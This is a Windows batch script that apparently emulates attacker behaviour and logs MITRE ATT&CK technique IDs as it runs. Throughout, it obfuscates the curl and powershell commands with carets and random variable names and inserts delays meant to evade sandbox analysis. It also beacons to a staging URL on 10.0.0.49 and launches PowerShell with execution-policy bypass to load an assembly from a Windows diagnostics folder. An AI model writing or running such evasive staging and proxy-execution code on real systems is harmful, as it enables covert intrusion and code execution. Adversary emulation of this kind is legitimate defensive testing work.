@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8137\be24d88b
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8137-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=chr0me.txt
SET dvhhyc=8137

REM Derived paths using random variable names
SET qlxdsw=%APPDATA%\!rrocubc!
SET hskfpt=!qlxdsw!\macula-simulations.log
SET kdfjwe=c:\windows\diagnostics\system\networking

REM Initial delay to evade sandbox analysis (30-60s)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start>>> "!hskfpt!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!hskfpt!" 2>nul

REM Delay between operations (5-15s)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_delay_start>>> "!hskfpt!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_delay_complete>>> "!hskfpt!" 2>nul

REM Heartbeat check using escaped curl command
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_start>>> "!hskfpt!" 2>nul
SET c^md1=cu^rl
SET cmd2= -k -^s -o nul
!cmd1!!cmd2! !keghkgto!
IF !ERRORLEVEL! NEQ 0 (
    SET vbhsfg=0
    SET bmdksj=timeout
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_failed>>> "!hskfpt!" 2>nul
) ELSE (
    SET vbhsfg=1
    SET bmdksj=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_success>>> "!hskfpt!" 2>nul
)

REM TTP logging for server communication
FOR /F "tokens=1-3 delims=." %%a IN ("!TIME!") DO SET mntms=%%a.%%b%%c
SET fkdjwe=!DATE! !TIME!
SET fkdjwe=!fkdjwe:/=-!
SET fkdjwe=!fkdjwe:.=:!
SET fkdjwe=!fkdjwe!.!mntms!
(
    echo [!fkdjwe!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!vbhsfg!:!bmdksj!
) >> "!hskfpt!" 2>nul || echo >nul

IF !vbhsfg! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: exiting_due_to_heartbeat_failure>>> "!hskfpt!" 2>nul
    exit /b 1
)

REM Random delay (10-29 seconds)
SET /A p^q^w^er=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_!pqwer!_seconds_start>>> "!hskfpt!" 2>nul
timeout /t !pqwer! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>>> "!hskfpt!" 2>nul

REM Prepare PowerShell command with heavy obfuscation
SET ps^f^rag1=po^w^ersh^e^ll.exe
SET ps^f^rag2= -ep b^yp^ass -co^mma^nd
SET ps^f^rag3= "set-location -path !kdfjwe!; im^port-module .\UtilityFunctions.ps1; RegSnapin !txisnba!\!xzanpex!;[Program.Class]::Dale()"

REM Change directory delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_delay_start>>> "!hskfpt!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_delay_complete>>> "!hskfpt!" 2>nul

REM Change to networking directory
cd /d !kdfjwe!
IF !ERRORLEVEL! NEQ 0 (
    SET mfnbcx=0
    SET vkdfje=directory_change_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_failed>>> "!hskfpt!" 2>nul
) ELSE (
    SET mfnbcx=1
    SET vkdfje=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_success>>> "!hskfpt!" 2>nul
)

REM Execute obfuscated PowerShell command
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution_start>>> "!hskfpt!" 2>nul
!psfrag1!!psfrag2!!psfrag3!
IF !ERRORLEVEL! NEQ 0 (
    SET znxbcv=0
    SET lkjsdf=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution_failed>>> "!hskfpt!" 2>nul
) ELSE (
    SET znxbcv=1
    SET lkjsdf=
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution_success>>> "!hskfpt!" 2>nul
)

REM TTP logging for signed binary proxy execution (T1218)
FOR /F "tokens=1-3 delims=." %%a IN ("!TIME!") DO SET lkdfje=%%a.%%b%%c
SET fghjkl=!DATE! !TIME!
SET fghjkl=!fghjkl:/=-!
SET fghjkl=!fghjkl:.=:!
SET fghjkl=!fghjkl!.!lkdfje!
(
    echo [!fghjkl!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!znxbcv!:!lkjsdf!
) >> "!hskfpt!" 2>nul || echo >nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start>>> "!hskfpt!" 2>nul
ping -n 4 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>>> "!hskfpt!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_completed>>> "!hskfpt!" 2>nul

ENDLOCAL
exit /b 0